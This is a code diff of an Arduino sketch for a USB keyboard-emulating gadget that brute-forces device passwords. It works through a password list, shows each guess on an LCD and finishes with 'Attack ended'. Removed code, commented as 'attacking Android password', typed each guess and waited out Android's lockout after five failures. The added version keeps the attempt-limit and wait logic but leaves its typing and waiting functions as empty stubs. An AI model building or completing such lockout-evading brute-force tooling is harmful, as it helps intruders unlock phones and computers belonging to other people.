@@ -67,9 +67,17 @@ int limitTest = 0;
 int timeToWait = 5000;
 */
 
-void lcdStart();
-void lcdPrint(char*);
-void lcdClear();
+
+#if not LCD16X2 and not CLASSIC_LCD
+  void lcdStart() {}
+  void lcdPrint(char*) {}
+  void lcdClear() {}
+#else
+  void lcdStart();
+  void lcdPrint(char*);
+  void lcdClear();
+#endif
+
 void keyboardStart();
 void typePassword(char*);
 void typeEnter();
@@ -77,77 +85,49 @@ void typeReturn();
 void typeTab();
 void waitButtonPressed();
 
-void setup() {
-  
-  int attempt = 0;
-  lcdStart();
-  
-  keyboardStart();
-/*
+//this function is used in order to allow to add delay between each letter (for slow UEFI) and so on
+void cutPassword(char* aPassword)
+{
 
-  
-  delay(5000);
-*/
+}
+
+//this function is used to made the system wait when system is lock (like on Android, 30s every 5 failed attempt)
+//for exemple on ... you have to type TAB 10 times to get back
+void waitFunction()
+{
+
+}
+
+  int attempt = 0;
+  bool limit = true;
+  int limitTest = 5;
+
+void setup() {
+  lcdStart();
+  keyboardStart();
+
   lcdPrint("Start: button1");
   waitButtonPressed();
   lcdClear();
 }
 
 void loop(){
-lcdPrint("Yeah");
-delay(5000);
-lcdClear();
-while(1) {}
-/*
-  while(!digitalRead(8)) {}
 
-  
-  while(password.hasNext()) {
-     //testedLogin = login.next()
-     char* testedPassword = password.next();
-     lcdClear();
-     delay(50);
-     lcdPrint(testedPassword);
-  
-     //here you put the action for example, attacking Android password
-     typePassword(testedPassword);
-     typeSpecial(KEY_RETURN);
-     delay(150);
+while(password.hasNext()) {
+  if(limit and attempt == limitTest) {
+    waitFunction();
+    attempt = 0;
+  } else {
+    char* testedPassword = password.next();
+    lcdClear();
+    lcdPrint(testedPassword);
+    cutPassword(testedPassword);
+    attempt++;
+  }
+}
 
-/*    if (password.hasNext()) {
-      typePassword("true");
-     typeSpecial(KEY_RETURN);
-    }
-    else {
-      typePassword("false");
-     typeSpecial(KEY_RETURN);
-    }
-*/
-     
-/*        attempt ++;
-
-        if (attempt == 5)
-        {
-          //Type enter to close warning box
-          delay(200);
-          enterKey();
-          
-          //Type enter every 5 second to keep android alive
-          for (keepalive = 0 ; keepalive < 30 ; keepalive++)
-          {
-            delay(1000);
-            enterKey();  
-          }
-     
-          //wait more
-          delay(100);
-          enterKey();
-          attempt = 0;
-        }
-*/    
-/*  
-   }
    lcdClear();
+   lcdPrint("Attack ended");
    while(1) {}
-*/
+
 }
